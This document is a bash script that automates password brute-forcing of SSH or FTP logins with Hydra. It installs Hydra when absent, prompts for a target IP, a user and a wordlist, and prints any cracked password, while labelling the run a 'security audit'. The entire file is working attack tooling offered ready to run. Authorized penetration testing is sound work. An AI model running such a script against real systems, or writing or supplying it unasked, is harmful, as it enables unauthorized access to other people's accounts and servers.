#!/bin/bash

# Colors

greenColour='\033[0;32m'
redColour='\033[0;31m'
endColour='\033[0m'
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Install dependencies if requiredColour

if ! command -v hydra &> /dev/null; then

    echo -e "${redColour}Hydra is not installed on the system${endColour}"
    echo -e "${turquoiseColour}Updating repositories${endColour}"
    sudo apt update > /dev/null
    echo -e "${turquoiseColour}Installing Hydra${endColour}"
    sudo apt install hydra -y > /dev/null

else

    echo "Hydra is already installed on the system"

fi

# Function to prompt user for input until a non-empty value is provided

prompt_input() {

    local prompt="$1"
    local var_name="$2"

    while true; do

        read -p "$prompt" "$var_name"

        if [ -z "${!var_name}" ]; then

            echo -e "${redColour}You must enter a value.${endColour}"

        else

            break

        fi

    done

}

# Configuration params

prompt_input "Please enter the target IP: " target
prompt_input "Enter the user: " user
prompt_input "Enter the dictionary: " dictionary

while [ ! -f "$dictionary" ]; do

    echo -e "${redColour}Password dictionary '$dictionary' does not exist.${endColour}"
    prompt_input "Enter the dictionary: " dictionary

done

ssh_attack() {

    # Start of brute force attack

    echo -e "${turquoiseColour}Initiating SSH security audit on $target...${endColour}"
    sleep 3

    output=$(hydra -l "$user" -P "$dictionary" ssh://"$target" -t 4 -vV 2>/dev/null)

    # Checking the result

    if echo "$output" | grep -qi "login:\|password:"; then

        password=$(echo "$output" | grep -oP "password: \K.*")
        echo -e "${greenColour}Password found, is:${endColour} $password"
        exit 0

    else

        echo -e "${redColour}No valid password found in file${endColour}"
        exit 1

    fi

}

ftp_attack() {

    # Start of brute force attack

    echo -e "${turquoiseColour}Initiating FTP security audit on $target...${endColour}"
    sleep 3

    output=$(hydra -l "$user" -P "$dictionary" ftp://"$target" -t 4 -vV 2>&1)

    # Checking the result

    if echo "$output" | grep -qi "login:\|password:"; then

        password=$(echo "$output" | grep -oP "password: \K.*")
        echo -e "${greenColour}Password found, is:${endColour} $password"
        exit 0

    else

        echo -e "${redColour}No valid password found in file${endColour}"
        exit 1

    fi

}

read -p "Choose whether you want to do the attack via SSH or FTP (Type SSH or FTP): " choice

while [ "$choice" != "SSH" ] && [ "$choice" != "FTP" ]; do

    echo -e "${redColour}You must type FTP or SSH ${endColour}"
    read -p "Choose whether you want to do the attack via SSH or FTP (Type SSH or FTP): " choice

done

if [ "$choice" == "SSH" ]; then

    ssh_attack

else

    ftp_attack

fi